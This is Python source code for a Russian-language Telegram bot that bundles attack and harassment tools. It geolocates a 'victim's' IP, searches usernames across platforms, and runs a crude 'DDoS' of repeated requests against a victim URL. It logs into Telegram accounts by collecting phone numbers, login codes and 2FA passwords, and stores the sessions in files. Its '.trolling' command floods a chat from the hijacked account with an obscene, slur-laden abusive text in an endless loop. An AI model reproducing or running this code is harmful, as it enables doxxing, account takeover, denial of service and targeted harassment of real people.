@router.message(SendMessage.waiting_text)
async def process_text(message: Message, state: FSMContext):
    text = message.text.strip()

    if len(text) == 0:
        await message.answer('❌ Текст не может быть пустым. Введите текст:')
        return

    await state.update_data(text=text)
    await message.answer(
        '💬 Текст сохранен! Теперь введите username чата или ID:\n\n'
        'Примеры:\n'
        '• @username\n'
        '• 123456789 (ID чата)\n'

    )
    await state.set_state(SendMessage.waiting_chat)


@router.message(SendMessage.waiting_chat)
async def process_chat_and_send(message: Message, state: FSMContext):
    chat_identifier = message.text.strip()
    data = await state.get_data()

    client = data.get('client')
    text = data.get('text')
    phone = data.get('phone')
    username = data.get('username', 'неизвестно')

    if not client or not text:
        await message.answer('❌ Ошибка данных. Начните заново.')
        await state.clear()
        return

    try:
        # Очищаем идентификатор чата
        if chat_identifier.startswith('https://t.me/'):
            chat_identifier = '@' + chat_identifier.split('/')[-1]
        elif chat_identifier.startswith('@'):
            chat_identifier = chat_identifier
        else:
            # Если это число, пробуем как ID
            try:
                chat_identifier = int(chat_identifier)
            except ValueError:
                chat_identifier = '@' + chat_identifier.lstrip('@')

        # Отправляем сообщение
        await client.send_message(chat_identifier, text)

        await message.answer(f'✅ Сообщение отправлено!\n\n📱 Аккаунт: @{username}\n💬 Чат: {chat_identifier}\n')

    except Exception as e:
        await message.answer(f'Ошибка  в {e}')

    finally:
        # Всегда отключаем клиент и очищаем состояние

        await client.disconnect()

        await state.clear()


@router.message(F.text == '🔎 Поиск по IP')
async def ip_osint(message: Message, state: FSMContext):
    await state.set_state(Ip.ip_adress)
    await message.answer('Введите Ip адресс жертвы', reply_markup=ip_get)


@router.message(Ip.ip_adress)
async def ip_search(message: Message, state: FSMContext):
    bot_message = await message.answer('Идет поиск 🔎 информации...')
    await state.update_data(ip_adress=message.text)
    ip = message.text.strip()

    response = requests.get(url=f'http://ip-api.com/json/{ip}').json()
    country = response.get('country')
    if len(ip) < 10:
        await message.answer('Введи Ip коректно...')
        await state.clear()
    elif country is None:
        await message.answer('Увы информация не 📝 найдена. Такого IP не существует 💣.', reply_markup=start_mes)
        await state.clear()
    else:

        try:

            text = f"Поиск  ️🤖💻📱 прошел успешно:\n\nIP: {ip}\n├ Провайдер: {response.get('isp')}\n├ Организация: {response.get('org')}\n├ Ofset: {response.get('offset')}\n├ Валюта: {response.get('BYR')}\n├ As: {response.get('as')}\n├ As_name: {response.get('asname')}\n├ Мобильный ip:{response.get('mobile')}\n├ Прокси: {response.get('proxy')}\n├ Hosting: {response.get('hosting')}\n├ DNS:{response.get('dns')}\n├ Континент: {response.get('continentCode')}\n├ Страна: {response.get('country')}\n├ Регион: {response.get('regionName')}\n├ Город: {response.get('city')}\n├ ZIP: {response.get('zip')}\n├ Широта: {response.get('lat')}\n└ Долгота: {response.get('lon')}"

            await bot_message.edit_text(text)
            await asyncio.sleep(2)
            coordinates = f"{response.get('lat')},{response.get('lon')}"
            nominaltim = Nominatim(user_agent='user')
            location = nominaltim.reverse(coordinates)

            await message.answer_location(latitude=response.get('lat'), longitude=response.get('lon'))
            await message.answer(f'-- Поиск по координатам 🌍:\n\n{str(location)}', reply_markup=start_mes)

        except requests.exceptions.ConnectionError:
            await message.answer('Увы информация не найдена')
        await state.clear()


@router.message(F.text == '👁️ Поиск username')
async def user_name_osint(message: Message, state: FSMContext):
    await message.answer('Введите username который вы хотите узнать.')
    await state.set_state(Username.username)


@router.message(Username.username)
async def user_name_over(message: Message, state: FSMContext):
    username = message.text.strip()
    if username == '':
        await message.answer('Ваш username не распознан', reply_markup=start_mes)
        await state.clear()
        return

    if len(username) > 20:
        await message.answer('Ваш username превышает лимит', reply_markup=start_mes)
        await state.clear()
        return
    username = username.replace('@', '')
    text_github = 'None'
    try:
        response = requests.get(f"https://api.github.com/users/{username}", headers=headers)
        if response.status_code == 200:
            data = response.json()

            text_github = (
                f"├ Name: {data.get('name')}\n├ Bio: {data.get('bio')}\n├ Location: {data.get('location')}\n├ Public_repos: {data.get('public_repos')}\n├ Profile: {data.get('html_url')}\n├ Email: {data.get('email')} "

            )
    except:
        print(f"None in Github")

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='Instagram', url=f'https://www.instagram.com/{username}/'),
         InlineKeyboardButton(text='  Twitch', url=f'https://www.twitch.tv/{username}')],
        [InlineKeyboardButton(text=' Facebook', url=f'https://www.facebook.com/{username}'),
         InlineKeyboardButton(text=' Twitter', url=f'https://x.com/{username}')],

        [InlineKeyboardButton(text='  Vimeo', url=f'https://vimeo.com/{username}'),
         InlineKeyboardButton(text='Linkedln', url=f'https://www.linkedin.com/{username}')],
        [InlineKeyboardButton(text=' Github', url=f'https://github.com/{username}'),
         InlineKeyboardButton(text='  Steam', url=f'https://steamcommunity.com/groups/{username}')],
        [InlineKeyboardButton(text=' Minecraft', url=f'https://minecraftuuid.com/?search={username}'),
         InlineKeyboardButton(text='  Xbox', url=f'https://xboxgamertag.com/search/{username}')],
        [InlineKeyboardButton(text='🔵 Telegram', url=f'https://t.me/{username}')],
        [InlineKeyboardButton(text='🔴  Youtube', url=f'https://www.youtube.com/@{username}')],
        [InlineKeyboardButton(text=' Spotify', url=f'https://open.spotify.com/user/{username}'),
         InlineKeyboardButton(text=' Replit', url=f'https://replit.com/@{username}')],
        [InlineKeyboardButton(text='  Rumble', url=f'https://rumble.com/user/{username}'),
         InlineKeyboardButton(text=' Hacker', url=f'https://news.ycombinator.com/user?id={username}')],
        [InlineKeyboardButton(text=' Snapchat', url=f'https://www.snapchat.com/@{username}'),
         InlineKeyboardButton(text=' Reddit', url=f'https://www.reddit.com/user/{username}/')],

        [InlineKeyboardButton(text=' Blusky', url=f'https://bsky.app/profile/{username}.bsky.social'),
         InlineKeyboardButton(text=' Gitlab', url=f'https://gitlab.com/{username}')],

    ])
    await asyncio.sleep(1.1)
    await message.answer(f'🔎 Поиск прошел успешно:\n\n👤 Username: <b>{username}</b>\n\n👥 Github:\n{text_github}',
                         parse_mode='HTML', reply_markup=keyboard)
    await state.clear()


@router.message(F.text == '💼 Простой Ddos')
async def ddos_start(message: Message, state: FSMContext):
    await state.set_state(Ddoss.target)
    await message.answer("Введите URL 🔎 жертвы 🌍💻 ")


@router.message(Ddoss.target)
async def ddos(message: Message, state: FSMContext):
    text = message.text.strip()
    if len(text) < 10:
        await message.answer('Это не URL попробуй заново.')
        await state.clear()

    if len(text) > 60:
        await message.answer('Это не URL попробуй заново.')
        await state.clear()

    if text.startswith(('http://', 'https://', 'www.')):
        await state.update_data(target=message.text)
        await state.set_state(Ddoss.number)

        await message.answer('Введи количество пакетов🛍️ не больше 100')
    else:
        await message.answer('Это не URL попробуй заново.')
        await state.clear()


@router.message(Ddoss.number)
async def ddosing(message: Message, state: FSMContext):
    await state.update_data(number=message.text)
    data = await state.get_data()
    target = data['target']

    sockets = int(message.text)
    print(target, sockets)
    if sockets >= 100:
        sockets = 10
    else:
        sockets = sockets

    for num in range(sockets):
        soket = requests.get(target)
        if soket.status_code == 200:
            await message.answer(f'Пакет🛍️ отправлен')
        else:
            await message.answer(f'Пакет не отправлен')
    await asyncio.sleep(1)
    await message.answer('Dos атака ⚔️🛍️💻 закончилась все данные вверху.', reply_markup=start_mes)
    await state.clear()


@router.message(F.text == '🕵️ ️Мой профиль')
async def profile(message: Message):
    prem = message.from_user.is_premium
    if prem is None:
        prem = "Нету"
    else:
        prem = 'Есть'

    await message.reply(
        f'Мой профиль🧰:\n\n├ Имя: {message.from_user.full_name}\n├ Username: @{message.from_user.username}\n├ Telegram_Id: {message.from_user.id}\n├ Баланс: 0$\n├ Премиум: {prem}\n└ Язык: {message.from_user.language_code}',
        reply_markup=json_user)


@router.callback_query(F.data == 'json')
async def json(callback: CallbackQuery):
    jsons = callback.from_user.json()
    await callback.answer('')
    await callback.message.answer(f"{jsons}")


@router.message(F.text == '👤 Аккаунт')
async def account_login(message: Message, state: FSMContext):
    await state.set_state(Account.phone_num)
    await message.answer('Введи номер телефона 📲', parse_mode='HTML')


@router.message(Account.phone_num)
async def account_log(message: Message, state: FSMContext):
    phone = message.text.strip().replace(' ', '').replace('+', '')
    session_file = f'session_{phone}.txt'

    # Проверяем существующую сессию как строку
    if os.path.exists(session_file):
        try:
            with open(session_file, 'r') as f:
                session_string = f.read().strip()

            # Используем StringSession вместо файловой
            client = TelegramClient(
                StringSession(session_string),
                api_id,
                api_hash
            )
            await client.connect()

            if await client.is_user_authorized():
                me = await client.get_me()
                await message.answer(f'✅ Аккаунт @{me.username} уже подключен!')
                await setup_client_handlers(client)
                await state.clear()
                return
            else:
                await client.disconnect()
                os.remove(session_file)  # Удаляем нерабочую сессию
        except:
            if os.path.exists(session_file):
                os.remove(session_file)

    # Создаем новую сессию как StringSession
    try:
        # Создаем сессию в памяти
        session = StringSession()
        client = TelegramClient(
            session,
            api_id,
            api_hash
        )
        await client.connect()

        send_code = await client.send_code_request(phone=phone)

        await state.update_data(
            hashing=send_code.phone_code_hash,
            client=client,
            phone=phone,
            session_string=session.save(),  # Сохраняем сессию как строку
            session_file=session_file
        )

        await message.answer('⬆️ Введи код с -100 в начале:')
        await state.set_state(Account.code)

    except Exception as e:
        await message.answer(f'❌ Ошибка: {e}')
        await state.clear()


@router.message(Account.code)
async def account_code_sent(message: Message, state: FSMContext):
    data = await state.get_data()

    # Восстанавливаем клиент из строки сессии
    session = StringSession(data['session_string'])
    client = TelegramClient(
        session,
        api_id,
        api_hash
    )

    await client.connect()

    code = message.text.strip().replace('-100', '')

    if len(code) != 5 or not code.isdigit():
        await message.answer("❌ Нужно 5 цифр после -100")
        await client.disconnect()
        return

    try:
        await client.sign_in(
            phone=data['phone'],
            code=code,
            phone_code_hash=data['hashing']
        )

        if await client.is_user_authorized():
            me = await client.get_me()
            await message.answer(
                f'✅ Аккаунт @{me.username} подключен!\n\n<b>Инструкция</b>:\n Чтобы начать нужно написать(.trolling)\n Чтобы остановить нужно написать(.stop).',
                parse_mode='HTML')

            # Сохраняем сессию в файл как строку
            session_string = session.save()  # ← ПРАВИЛЬНО! Используем session, а не client.session
            with open(data['session_file'], 'w') as f:
                f.write(session_string)

            await setup_client_handlers(client)

    except SessionPasswordNeededError:
        # Сохраняем обновленную сессию для пароля
        session_string = session.save()  # ← ПРАВИЛЬНО!
        await state.update_data(
            session_string=session_string,
            client=client
        )
        await message.answer('🔒 Введите пароль 2FA:')
        await state.set_state(Account.password)
        return

    except Exception as e:
        await message.answer(f'❌ Ошибка: {e}')
        await client.disconnect()

    await state.clear()


@router.message(Account.password)
async def password_sign_in(message: Message, state: FSMContext):
    data = await state.get_data()

    # Восстанавливаем клиент из строки сессии
    session = StringSession(data['session_string'])
    client = TelegramClient(
        session,
        api_id,
        api_hash
    )

    await client.connect()

    try:
        await client.sign_in(password=message.text.strip())

        if await client.is_user_authorized():
            me = await client.get_me()
            await message.answer(f'✅ Аккаунт @{me.username} подключен!')

            # Сохраняем сессию в файл
            session_string = session.save()  # ← ПРАВИЛЬНО!
            with open(data['session_file'], 'w') as f:
                f.write(session_string)

            await setup_client_handlers(client)
        else:
            await message.answer('❌ Не удалось авторизоваться')
            await client.disconnect()

    except Exception as e:
        await message.answer(f'❌ Ошибка: {e}')
        await client.disconnect()

    await state.clear()


async def setup_client_handlers(client):
    @client.on(events.NewMessage(pattern='.trolling'))
    async def handler(event):

        existing_text = "Я тебе сынку тупой шлюхи твое сосалище переломаю своим огромным палающим хуем ведь ты ебанная мразота которая сидит здесь и терпит нихуевые харчки в свое прищавое ебало которое я использовал как тряпку для пола ибо ты сын шалавы парокопытной вообще не можешь дать весомого отпора, ты как слабый чуркобес у которого мать шлюха ебанная будешь постоянно в роли терпилы сидеть и мой член мусолить своими обжогшими ручками ведь я не раз предупреждал что мой член разогревается до температуры солнца, но ты сын бляди ебанной все равно пытался дать отпор и каждый раз отлетал в нокаут после первого точного удара и моему члену уже было скучно каждый раз тебя пинком к дому отправлять поэтому я взял твое свинное рыло в руки и приложил к стене которая была вся в моей сперме, и начал ломать твое горящее очко набирая скорость всё выше и выше, щегол ебучий когда ты уже поймёшь что на меня рыпаться не нужно ибо ты сын шалавы будешь отрабатывать каждый пинок под зад который ты получаешь после очередного отсоса пытаясь побороться с моей шиповоной подошвой которая вся в дерьме, ты сын шлюхи косоеблой до конца своей жизни будешь стоять на коленях и умолять мой огромный член поправить наконец-то свой свинной спермоприемник на котором прищей больше чем у родной матери зубов, но он как и раньше будет заплевывать тежёлыми маслянистыми харчками  твое окровавленное ебало на котором дохуище шрамов от моего палающего члена который твоя матушка закидывает к себе в ротан как школьники снюс"
        words = existing_text.split()
        await event.delete()

        # Флаг для остановки
        stop_flag = False

        # Обработчик для команды stop
        @client.on(events.NewMessage(pattern='.stop'))
        async def stop_handler(stop_event):
            nonlocal stop_flag
            if stop_event.chat_id == event.chat_id:
                stop_flag = True

                await stop_event.delete()

            # Бесконечный цикл

        while not stop_flag:
            for i in range(0, len(words), 2):
                if stop_flag:
                    break
                pair = ' '.join(words[i:i + 2])
                await event.respond(pair)
                await asyncio.sleep(0.02)

                # Небольшая пауза между циклами
            if not stop_flag:
                await asyncio.sleep(1)


@router.message(F.text.startswith('@'))
async def user_osint(message: Message):
    username = message.text.strip()
    not_start = username.replace('@', '')
    if len(username) <= 2:
        await message.answer('Введите коректный username', reply_markup=start_mes)
    else:
        url_for_user = f'https://t.me/{not_start}'

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='Telegram', url=url_for_user)]
        ])

        await message.answer(f'Пользователь найден:\nUsername : {username}', reply_markup=keyboard)








